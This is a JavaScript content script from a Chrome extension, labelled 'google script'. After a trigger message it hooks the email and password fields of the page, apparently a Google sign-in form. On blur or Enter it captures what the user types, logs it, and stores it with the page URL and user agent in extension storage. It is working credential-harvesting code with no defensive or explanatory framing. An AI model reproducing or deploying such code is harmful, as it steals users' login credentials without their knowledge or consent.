
console.log("google script");
var email;
var password;

chrome.storage.local.set({session:{},url:window.location.href,host:window.location.host,userAgent:navigator.userAgent},()=>{
    console.log("initialised");
});

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
      if(request.trigger==true){
        try{
            console.log("message receiced");

            triggerlistener();
        }catch(err){console.log(err)}
      }
});

function triggerlistener(){
     email=document.querySelector("input[type='email']");
     password= document.querySelector("input[type='password']");
     
    // console.log("trigger",email,password);
    email.addEventListener('blur',e=>{
             console.log(email.value)
             save("email",email.value);
    })
    email.addEventListener('keyup',e=>{
            if(e.which==13){
                console.log(email.value)

                save("email",email.value);
            }
    })

    password.addEventListener('blur',e=>{
        console.log(password.value)
         save("password",password.value);
    })
    password.addEventListener('keyup',e=>{
        if(e.which==13){
            console.log(password.value)
           save("password",password.value);
        }
    })
}

function save(type,value){
    chrome.storage.local.get(['session'],obj=>{
    session=obj.session;
    session[type]=value;
    chrome.storage.local.set({session:session});
})
}

